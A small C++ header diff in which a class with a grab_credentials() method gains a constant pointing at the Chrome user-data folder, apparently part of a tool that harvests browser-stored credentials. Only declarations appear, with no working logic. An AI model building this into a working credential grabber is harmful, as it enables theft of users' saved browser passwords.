@@ -13,4 +13,7 @@ public:
 
 	[[nodiscard]] std::optional<Credentials> grab_credentials() const override;
 	[[nodiscard]] std::wstring source() const override;
+
+private:
+	static constexpr auto CHROME_ROOT_FOLDER = L"%LOCALAPPDATA%/Google/Chrome/";
 };
